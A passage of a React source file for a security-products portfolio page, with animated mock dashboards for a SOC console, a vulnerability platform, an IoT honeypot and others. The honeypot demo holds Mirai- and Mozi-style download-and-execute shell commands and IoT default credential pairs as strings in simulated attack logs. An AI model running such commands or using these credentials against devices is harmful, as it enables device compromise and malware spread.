import React, { useState, useEffect, useRef } from 'react'
import { motion, AnimatePresence, useMotionValue, useSpring, useTransform } from 'framer-motion'
import { usePrefersReducedMotion } from '../hooks/usePrefersReducedMotion'
import ScrambleText from '../components/ScrambleText'
import { playLockdownSound, playSuccessSound } from '../lib/synth'

const PRODUCTS = [
  {
    id: 'shielddesk',
    label: 'SHIELDDESK',
    tagline: 'Cybersecurity Command Center',
    statusBadge: 'Flagship',
    description: 'A comprehensive enterprise cybersecurity posture, operations, and incident response platform. Built with React & TypeScript — serving as a central intelligence hub for SOC analysts, IT administrators, and security leadership to monitor, manage, and remediate organizational risks in real time.',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop',
    features: ['Real-time Risk Monitoring', 'Incident Response', 'Threat Intelligence', 'SOC Dashboard', 'Compliance Tracking'],
    color: '#C9A84C',
    badge: '01',
  },
  {
    id: 'vmp',
    label: 'VMP',
    tagline: 'Vulnerability Management Platform',
    description: 'A production-grade, multi-tenant security intelligence platform. Employs a Predictive Risk Prioritization Engine to parse thousands of daily alerts, matching NVD and CISA databases to isolate the 1% of vulnerabilities posing real, immediate operational threats.',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2070&auto=format&fit=crop',
    features: ['Predictive Risk Engine', 'NVD & CISA Feeds', 'Known Exploited Vulns', 'Automated SLA Tracking', 'Remediation Roadmaps'],
    color: '#D4876B',
    badge: '02',
  },
  {
    id: 'sentineliot',
    label: 'SENTINEL-IoT',
    tagline: 'Deception Honeypot System',
    description: 'An advanced IoT honeypot emulating vulnerable connected devices (CCTVs, routers, DVRs). Captures automated malware scanner attacks, silently logging credentials dictionary brute-force, command sequences, and payload binaries.',
    image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2070&auto=format&fit=crop',
    features: ['Telnet/SSH Emulation', 'High-Fidelity Deception', 'Payload Extraction', 'SQLite & Cold Logging', 'Malware Downloader'],
    color: '#00FF9D',
    badge: '03',
  },
  {
    id: 'smecyber',
    label: 'Codex SME Cyber',
    tagline: 'SME Risk Dashboard',
    description: 'A cybersecurity posture management platform engineered for small and medium-sized businesses. Provides domain vulnerability scanning, guided expert questionnaires, automated weighted scoring, and compliance reporting.',
    image: 'https://images.unsplash.com/photo-1460925895917-afdab827c52f?q=80&w=2015&auto=format&fit=crop',
    features: ['Domain Scanning', 'Expert Questionnaires', 'Weighted Scoring Engine', 'Framework Mapping', 'PDF Report Export'],
    color: '#7BAADB',
    badge: '04',
  },
  {
    id: 'securevault',
    label: 'SecureVault',
    tagline: 'Fleet Hardware Diagnostic',
    description: 'Next-generation hardware integrity and security diagnostic platform for enterprise fleet management. Built with a macOS-inspired Liquid Glass aesthetic, providing differential audits, re-keying automation, and Slack/Discord webhook alerts.',
    image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=2070&auto=format&fit=crop',
    features: ['Differential Analysis', 'Secure Enclave Audits', 'Identity Purge SOPs', 'Slack & Discord Hooks', 'Historical Archives'],
    color: '#B784A7',
    badge: '05',
  },
  {
    id: 'jobguard',
    label: 'JOBGUARD-UK',
    tagline: 'Fake Job Scam Crawler',
    description: 'A fully automated cyber-intelligence platform that crawls UK recruitment portals and Telegram/WhatsApp recruiter networks. Leverages BERT language models to attribute templates and Neo4j graphs to trace crypto and bank-mule networks.',
    image: 'https://images.unsplash.com/photo-1586281380349-632531db7ed4?q=80&w=2070&auto=format&fit=crop',
    features: ['BERT NLP Attribution', 'Neo4j Graph Network', 'Telegram/WhatsApp Scraping', 'Abuse Takedown Engine', 'Crypto Payment Tracing'],
    color: '#E0558A',
    badge: '06',
  },
  {
    id: 'erp',
    label: 'MINTS ERP',
    tagline: 'Enterprise Resource Planning',
    statusBadge: 'Most Selling',
    description: 'A state-of-the-art ERP system designed to centralize and automate core business operations. High-performance interface for HR, CRM, Project Management, Financial Tracking, and Automated Workflows — all in one unified platform.',
    image: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?q=80&w=2070&auto=format&fit=crop',
    features: ['HR Management', 'CRM & Sales', 'Project Tracking', 'Financial Analytics', 'Workflow Automation'],
    color: '#7BAE9C',
    badge: '07',
  },
  {
    id: 'mintcare',
    label: 'MINTCARE',
    tagline: 'Care Home Management',
    description: 'A comprehensive, role-based management application for modern care home administration. Features secure Google Sign-In, incident management, compliance tracking, resident care logs, analytics dashboard, family portal, and multi-role staff management.',
    image: 'https://images.unsplash.com/photo-1576091160399-112ba8d25d1d?q=80&w=2070&auto=format&fit=crop',
    features: ['Resident Management', 'Incident Reporting', 'Compliance Tracking', 'Family Portal', 'Staff Scheduling'],
    color: '#89B4A0',
    badge: '08',
  },
  {
    id: 'minora',
    label: 'MINORA',
    tagline: 'Event Control Platform',
    statusBadge: 'Under Production',
    description: 'A robust digital event control platform designed to manage and orchestrate large-scale physical and virtual events seamlessly. Real-time coordination, attendee management, and live analytics in a single command interface.',
    image: 'https://images.unsplash.com/photo-1492684223066-81342ee5ff30?q=80&w=2070&auto=format&fit=crop',
    features: ['Event Orchestration', 'Attendee Management', 'Live Analytics', 'Virtual Integration', 'Real-time Control'],
    color: '#C9A84C',
    badge: '09',
  },
]

/* ─── SHIELDDESK SECURITY SANDBOX ─── */
function ShieldDeskSandbox() {
  const [threatLevel, setThreatLevel] = useState(12)
  const [lockdown, setLockdown] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [logs, setLogs] = useState([
    '[INFO] Initializing security core...',
    '[INFO] All firewall clusters report green.',
    '[INFO] Listening for incoming network packets...'
  ])

  const runScan = () => {
    if (scanning || lockdown) return
    setScanning(true)
    setLogs(prev => [...prev, '[SCAN] Running automated network port scan...'])
    setTimeout(() => {
      const foundThreats = Math.random() > 0.7 ? 1 : 0
      const newThreat = foundThreats ? Math.floor(Math.random() * 20) + 30 : Math.floor(Math.random() * 8) + 4
      setThreatLevel(newThreat)
      setLogs(prev => [
        ...prev,
        `[SCAN] Port scan completed. Found ${foundThreats} vulnerability risks.`,
        `[SCAN] Risk posture updated: ${newThreat}% threat score.`
      ])
      setScanning(false)
    }, 1000)
  }

  const triggerLockdown = () => {
    setLockdown(true)
    setThreatLevel(100)
    setLogs(prev => [
      ...prev,
      '[ALERT] CRITICAL LOCKDOWN INITIATED.',
      '[ALERT] Severing external routing endpoints...',
      '[OK] Security lockdown sequence finalized.'
    ])
    playLockdownSound()
  }

  const resetSystem = () => {
    setLockdown(false)
    setThreatLevel(12)
    setLogs(prev => [
      ...prev,
      '[INFO] Security lockdown reset authorized.',
      '[INFO] Restoring default network gateways...',
      '[OK] Posture normalized.'
    ])
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* Alarm Warning Scrim */}
      <AnimatePresence>
        {lockdown && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 0.15 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 bg-red-600 pointer-events-none z-0 animate-pulse"
          />
        )}
      </AnimatePresence>

      {/* Grid status */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 relative z-10">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Risk Posture</span>
          <span className={`text-2xl font-bold font-number ${lockdown ? 'text-red-500' : 'text-accent-gold'}`}>{threatLevel}%</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Access Logs</span>
          <span className="text-sm font-bold text-beige-100">{logs.length} Recorded</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Firewall State</span>
          <span className={`text-sm font-bold ${lockdown ? 'text-red-500' : 'text-green-400 animate-pulse'}`}>
            {lockdown ? 'OFFLINE (SHIELDED)' : 'ACTIVE (SAFE)'}
          </span>
        </div>
      </div>

      {/* Cyber terminal logs */}
      <div className="flex-1 min-h-[160px] liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2 relative z-10">
        <div className="flex items-center justify-between border-b border-white/5 pb-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300">Terminal Shell</span>
          <div className="flex gap-1.5">
            <span className="w-2.5 h-2.5 rounded-full bg-red-500/30" />
            <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/30" />
            <span className="w-2.5 h-2.5 rounded-full bg-green-500/30" />
          </div>
        </div>
        <div className="flex-1 overflow-y-auto flex flex-col gap-1 pr-2 max-h-[220px]">
          {logs.map((log, index) => (
            <div key={index} className={log.includes('ALERT') || log.includes('CRITICAL') ? 'text-red-400 font-bold' : log.includes('SCAN') ? 'text-accent-gold' : 'text-beige-300'}>
              {log}
            </div>
          ))}
          {scanning && <div className="text-accent-gold animate-pulse">Scanning ports in progress...</div>}
        </div>
      </div>

      {/* Shell Controls */}
      <div className="flex flex-wrap gap-3 mt-auto relative z-10">
        {!lockdown ? (
          <>
            <button
              onClick={runScan}
              disabled={scanning}
              data-cursor="link"
              className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50"
            >
              {scanning ? 'Scanning...' : 'Scan Segment'}
            </button>
            <button
              onClick={triggerLockdown}
              data-cursor="link"
              className="px-4 py-2 bg-red-600/90 text-white rounded hover:bg-red-500 transition-colors"
            >
              Trigger Lockdown
            </button>
          </>
        ) : (
          <button
            onClick={resetSystem}
            data-cursor="link"
            className="px-4 py-2 bg-accent-gold text-bg-deep rounded hover:bg-beige-100 transition-colors font-bold"
          >
            System Recovery Reset
          </button>
        )}
      </div>
    </div>
  )
}

/* ─── VMP RISK PRIORITIZATION ENGINE SANDBOX ─── */
function VmpSandbox() {
  const [riskScore, setRiskScore] = useState(84)
  const [totalVulns, setTotalVulns] = useState(12480)
  const [filtering, setFiltering] = useState(false)
  const [cves, setCves] = useState([
    { id: 'CVE-2026-0012', desc: 'Remote Code Execution in Core Lib', priority: 'High', threat: 'Exploited in wild' },
    { id: 'CVE-2025-4491', desc: 'Buffer Overflow in Net Gateway', priority: 'Medium', threat: 'Proof of concept' },
    { id: 'CVE-2025-1102', desc: 'Auth Bypass in SSO Cluster', priority: 'Critical', threat: 'Active scan activity' }
  ])
  const [logs, setLogs] = useState([
    '[INIT] Connecting to global NVD & CISA feeds...',
    '[INIT] Pulled 12,480 total vulnerability records.',
    '[WARNING] 84% Risk Posture score: Immediate attention required.'
  ])

  const runPredictiveFilter = () => {
    if (filtering) return
    setFiltering(true)
    setLogs(prev => [...prev, '[FILTER] Running Predictive Risk Prioritization...'])
    setTimeout(() => {
      setTotalVulns(42)
      setRiskScore(14)
      setCves([
        { id: 'CVE-2025-1102', desc: 'Auth Bypass in SSO Cluster', priority: 'Critical', threat: 'Active scan activity (MITIGATED)' }
      ])
      setLogs(prev => [
        ...prev,
        '[FILTER] NVD/CISA match complete. Removed 12,438 non-exploited vulnerabilities (99.6% noise reduction).',
        '[FILTER] Risk posture score reduced: 14% threat score.'
      ])
      setFiltering(false)
      playSuccessSound()
    }, 1200)
  }

  const remediateCve = (id) => {
    setCves(prev => prev.filter(c => c.id !== id))
    setLogs(prev => [...prev, `[REMEDIATE] Patched and resolved vulnerability ${id}.`])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Total Vulnerabilities</span>
          <span className="text-xl font-bold font-number text-accent-gold">{totalVulns.toLocaleString()}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Executive Risk Score</span>
          <span className={`text-xl font-bold font-number ${riskScore > 50 ? 'text-red-500' : 'text-green-400'}`}>{riskScore}%</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Predictive Filter</span>
          <span className="text-xl font-bold text-beige-100">{filtering ? 'FILTERING...' : totalVulns > 100 ? 'NOISE ACTIVE' : 'OPTIMIZED'}</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Prioritized Vulnerabilities */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Actionable CVEs (Click to remediate)</span>
          <div className="flex flex-col gap-2 overflow-y-auto max-h-[160px] pr-2">
            {cves.length === 0 ? (
              <div className="text-green-400">All prioritized threats resolved!</div>
            ) : (
              cves.map(c => (
                <button
                  key={c.id}
                  onClick={() => remediateCve(c.id)}
                  data-cursor="link"
                  className="p-3 rounded bg-bg-elevated border border-white/5 text-[9px] text-left hover:border-accent-gold/40 transition-colors flex justify-between items-center"
                >
                  <div>
                    <div className="font-bold text-beige-100">{c.id} — {c.desc}</div>
                    <div className="text-beige-300/60 mt-0.5">Threat: {c.threat}</div>
                  </div>
                  <span className={`px-2 py-0.5 rounded text-[8px] font-bold ${c.priority === 'Critical' ? 'bg-red-950/40 text-red-400 border border-red-500/20' : 'bg-yellow-950/40 text-yellow-400 border border-yellow-500/20'}`}>
                    {c.priority}
                  </span>
                </button>
              ))
            )}
          </div>
        </div>

        {/* System log */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">VMP Log Stream</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-1.5 text-[9px] text-beige-300">
            {logs.map((log, index) => (
              <div key={index} className={log.includes('WARNING') ? 'text-red-400 font-bold' : log.includes('FILTER') ? 'text-accent-gold' : 'text-beige-300/70'}>
                {log}
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={runPredictiveFilter}
          disabled={filtering || totalVulns <= 50}
          data-cursor="link"
          className="px-4 py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors disabled:opacity-50 text-[10px] uppercase tracking-wider"
        >
          {filtering ? 'Prioritizing...' : 'Run Predictive Filter'}
        </button>
      </div>
    </div>
  )
}

/* ─── SENTINEL-IOT HONEYPOT SANDBOX ─── */
function SentinelIotSandbox() {
  const [emulatorState, setEmulatorState] = useState('ACTIVE')
  const [attacksCount, setAttacksCount] = useState(148)
  const [logs, setLogs] = useState([
    '[INIT] Sentinel-IoT core listening on Port 22 (SSH) and Port 23 (Telnet)...',
    '[OK] Emulating Hikvision CCTV Interface v4.2.8...',
    '[INTEL] Capturing malware payloads silently.'
  ])
  const [intelList, setIntelList] = useState([])

  const simulateAttack = () => {
    if (emulatorState !== 'ACTIVE') return
    const creds = [
      'admin:1234 (Hikvision DVR)',
      'root:xc3511 (Dahua DVR)',
      'realtek:realtek (Realtek Router SDK)',
      'admin:admin (Netgear Generic)'
    ]
    const payloads = [
      'wget http://84.220.19.12/bins/mirai.arm7 -O - | sh',
      'curl http://mozi.onion/malware.sh -o mozi.sh; chmod +x mozi.sh; ./mozi.sh',
      'echo -e "\\x7f\\x45\\x4c\\x46" > /tmp/malware'
    ]

    const selectedCred = creds[Math.floor(Math.random() * creds.length)]
    const selectedPayload = payloads[Math.floor(Math.random() * payloads.length)]

    setAttacksCount(prev => prev + 1)
    setLogs(prev => [
      ...prev,
      `[ATTACK] Brute force attempt from IP: ${Math.floor(Math.random() * 150 + 10)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      `[ATTACK] Tried credential combo: ${selectedCred}`,
      `[DECEPTION] Intruder authenticated. Shell session spawned.`,
      `[PAYLOAD] Execution attempt blocked: "${selectedPayload}"`,
      `[MALWARE] Safe downloader triggered. Extraction started...`
    ])

    setTimeout(() => {
      setIntelList(prev => [
        `Captured Payload: "${selectedPayload.slice(0, 32)}..." from threat node.`,
        ...prev
      ])
      setLogs(prev => [...prev, `[OK] Captured and sandboxed malware sample successfully.`])
      playSuccessSound()
    }, 1000)
  }

  const toggleEmulator = () => {
    if (emulatorState === 'ACTIVE') {
      setEmulatorState('OFFLINE')
      setLogs(prev => [...prev, '[SYS] Honeypot emulator listeners suspended.'])
    } else {
      setEmulatorState('ACTIVE')
      setLogs(prev => [...prev, '[SYS] Restored IoT device decapsulation listeners.'])
      playSuccessSound()
    }
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Honeypot State</span>
          <span className={`text-xl font-bold ${emulatorState === 'ACTIVE' ? 'text-green-400 animate-pulse' : 'text-red-500'}`}>{emulatorState}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Captured Attacks</span>
          <span className="text-xl font-bold font-number text-accent-gold">{attacksCount}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Vectors Emulated</span>
          <span className="text-sm font-bold text-beige-100">Telnet (23) / SSH (22)</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Live Attack Logs */}
        <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Honeypot Shell Monitor</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-1 text-[9px] pr-1">
            {logs.map((log, i) => (
              <div key={i} className={log.includes('PAYLOAD') ? 'text-red-400' : log.includes('OK') ? 'text-green-400' : log.includes('ATTACK') ? 'text-accent-gold' : 'text-beige-300/60'}>
                {log}
              </div>
            ))}
          </div>
        </div>

        {/* Captured Intelligence */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Malware Captured</span>
          <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-2 text-[9px] text-beige-300/70">
            {intelList.length === 0 ? (
              <div className="text-beige-300/30">Awaiting payload vectors...</div>
            ) : (
              intelList.map((intel, idx) => (
                <div key={idx} className="border-l-2 border-accent-gold pl-2">{intel}</div>
              ))
            )}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={simulateAttack}
          disabled={emulatorState !== 'ACTIVE'}
          data-cursor="link"
          className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50 text-[10px]"
        >
          Simulate Attack Vector
        </button>
        <button
          onClick={toggleEmulator}
          data-cursor="link"
          className={`px-4 py-2 rounded text-bg-deep font-bold transition-colors text-[10px] uppercase ${emulatorState === 'ACTIVE' ? 'bg-red-500 hover:bg-red-400' : 'bg-green-400 hover:bg-green-300'}`}
        >
          {emulatorState === 'ACTIVE' ? 'Stop Honeypot' : 'Start Honeypot'}
        </button>
      </div>
    </div>
  )
}

/* ─── SME CYBER RISK DASHBOARD SANDBOX ─── */
function SmeCyberSandbox() {
  const [domain, setDomain] = useState('')
  const [scanning, setScanning] = useState(false)
  const [riskGrade, setRiskGrade] = useState('D')
  const [scores, setScores] = useState({ domainScore: 40, questionnaireScore: 55 })
  const [logs, setLogs] = useState([
    '[SYSTEM] Codex SME Cyber initial posture dashboard.',
    '[SYSTEM] Maturity grade is calculated from Domain Scanning + Assessment.',
    '[OK] Posture grade: D (Urgent action advised)'
  ])

  const runDomainScan = (e) => {
    e.preventDefault()
    if (!domain || scanning) return
    setScanning(true)
    setLogs(prev => [...prev, `[SCAN] Running non-intrusive domain scan on: ${domain}...`])
    setTimeout(() => {
      setScores(prev => ({ ...prev, domainScore: 88 }))
      setRiskGrade('B')
      setLogs(prev => [
        ...prev,
        `[SCAN] Port scan & DNS audit completed for ${domain}.`,
        '[SCAN] No critical vulnerabilities found in domain dns record.',
        '[OK] Grade updated: B (Good posture)'
      ])
      setScanning(false)
      playSuccessSound()
    }, 1200)
  }

  const answerQuestionnaire = () => {
    setScores(prev => ({ ...prev, questionnaireScore: 92 }))
    setRiskGrade(prev => (prev === 'B' || prev === 'A' ? 'A' : 'C'))
    setLogs(prev => [
      ...prev,
      '[ASSESSMENT] Questionnaires audited (MFA enforced, daily offline backups verified).',
      '[OK] Security compliance score increased.'
    ])
    playSuccessSound()
  }

  const calculatedScore = Math.floor((scores.domainScore + scores.questionnaireScore) / 2)

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Security Grade</span>
          <span className={`text-xl font-bold font-number ${riskGrade === 'A' || riskGrade === 'B' ? 'text-green-400' : 'text-red-500'}`}>{riskGrade}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Weighted Score</span>
          <span className="text-xl font-bold text-accent-gold">{calculatedScore} / 100</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Domain Check</span>
          <span className="text-xl font-bold text-beige-100">{scanning ? 'SCANNING...' : 'READY'}</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Domain Scan Panel */}
        <form onSubmit={runDomainScan} className="w-full md:w-1/2 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20 justify-center">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Automated Domain Scanner</span>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Target Domain Name</label>
            <input
              type="text"
              value={domain}
              onChange={e => setDomain(e.target.value)}
              placeholder="e.g. example.com"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-xs"
            />
          </div>
          <button
            type="submit"
            disabled={scanning || !domain}
            data-cursor="link"
            className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] disabled:opacity-50"
          >
            {scanning ? 'Scanning Domain...' : 'Scan Domain'}
          </button>
        </form>

        {/* Assessment & Logs */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Remediation Status Logs</span>
          <div className="flex-1 liquid-glass-panel p-3 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-1.5 text-[9px] text-beige-300/70">
              {logs.map((log, index) => (
                <div key={index} className="border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
            <button
              onClick={answerQuestionnaire}
              data-cursor="link"
              className="w-full py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded text-[10px] uppercase"
            >
              Simulate Compliance Assessment
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── SECUREVAULT FLEET DIAGNOSTIC SANDBOX ─── */
function SecureVaultSandbox() {
  const [deviceCompare, setDeviceCompare] = useState('Apple vs Samsung')
  const [logs, setLogs] = useState([
    '[VAULT] Cryptographic registry operational.',
    '[VAULT] Active fleet: 1,480 units.',
    '[OK] Differential integrity: Balanced'
  ])
  const [mitigating, setMitigating] = useState(false)
  const [biometricsStatus, setBiometricsStatus] = useState('Drift Detected')

  const triggerRemediation = () => {
    if (mitigating) return
    setMitigating(true)
    setLogs(prev => [...prev, '[PATCH] Enrolling new Secure Enclave keys...', '[PATCH] Running identification protocols...'])
    setTimeout(() => {
      setBiometricsStatus('KEYS STABLE')
      setLogs(prev => [
        ...prev,
        '[PATCH] Mitigated CVE in local fleet kernel.',
        '[OK] Fleet biometric keys stabilized successfully.'
      ])
      setMitigating(false)
      playSuccessSound()
    }, 1200)
  }

  const changeComparison = (e) => {
    const val = e.target.value
    setDeviceCompare(val)
    setLogs(prev => [
      ...prev,
      `[COMPARE] Auditing fleet deltas: ${val}`,
      `[COMPARE] Registry Status: Apple Secure Enclave vs Samsung Knox verified.`
    ])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Enclave State</span>
          <span className={`text-sm font-bold ${biometricsStatus === 'KEYS STABLE' ? 'text-green-400' : 'text-red-500 animate-pulse'}`}>{biometricsStatus}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Alert Protocols</span>
          <span className="text-sm font-bold text-beige-100">Slack/Discord Webhooks</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Fleet Count</span>
          <span className="text-sm font-bold text-accent-gold">1,480 Units</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Compare Engine */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Differential Analysis</span>
          <div className="flex flex-col gap-2 justify-center h-full">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Auditing Delta Matrix</label>
            <select
              value={deviceCompare}
              onChange={changeComparison}
              className="bg-bg-deep border border-glass-border rounded px-2 py-1.5 text-beige-100 focus:outline-none focus:border-accent-gold text-xs"
            >
              <option value="Apple vs Samsung">Apple Secure Enclave vs Samsung Knox</option>
              <option value="Windows Hello vs Mac">Windows Hello vs Apple T2</option>
              <option value="Yubikey vs Titan">Yubikey 5 FIPS vs Google Titan</option>
            </select>
          </div>
        </div>

        {/* Audit timeline */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Auditor Log Timeline</span>
          <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-1.5 text-[9px] text-beige-300/70">
              {logs.map((log, index) => (
                <div key={index} className="border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
            <button
              onClick={triggerRemediation}
              disabled={mitigating || biometricsStatus === 'KEYS STABLE'}
              data-cursor="link"
              className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] uppercase tracking-wider disabled:opacity-50"
            >
              {mitigating ? 'Mitigating Kernel...' : 'Deploy Cryptographic Mitigation'}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── JOBGUARD-UK SCAM TRACKER SANDBOX ─── */
function JobGuardSandbox() {
  const [crawling, setCrawling] = useState(false)
  const [attribution, setAttribution] = useState('No Campaign Loaded')
  const [nodesCount, setNodesCount] = useState(0)
  const [logs, setLogs] = useState([
    '[INIT] JobGuard-UK engine online. Scanning UK recruitment portals...',
    '[INIT] Crawlers listening for suspicious WhatsApp/Telegram recruiters.',
    '[OK] Threat model database loaded.'
  ])

  const runCrawl = () => {
    if (crawling) return
    setCrawling(true)
    setLogs(prev => [...prev, '[BERT] Scraping recruitment boards for ad templates...', '[BERT] Parsing syntax structures...'])
    setTimeout(() => {
      setAttribution('BERT Index: Advance-Fee Recruiter Fraud (98.4% Confidence)')
      setNodesCount(12)
      setLogs(prev => [
        ...prev,
        '[BERT] Scrape complete. Identified active scam campaign.',
        '[OK] Fingerprint matching: BERT identified organized criminal network template.',
        '[GRAPH] Built Neo4j map: 12 infrastructure nodes linked (IPs, Wallets, Telegram handles).'
      ])
      setCrawling(false)
      playSuccessSound()
    }, 1200)
  }

  const triggerTakedown = () => {
    setLogs(prev => [
      ...prev,
      '[DISRUPT] Compiling Neo4j infrastructure data...',
      '[DISRUPT] Automated abuse packet dispatched to ISP and Registrar.',
      '[OK] Abuse takedown notice completed: Campaign servers blocked.'
    ])
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">BERT Attribution</span>
          <span className="text-[10px] font-bold text-accent-gold truncate">{attribution}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Neo4j Nodes Mapped</span>
          <span className="text-xl font-bold font-number text-beige-100">{nodesCount}</span>
        </div>
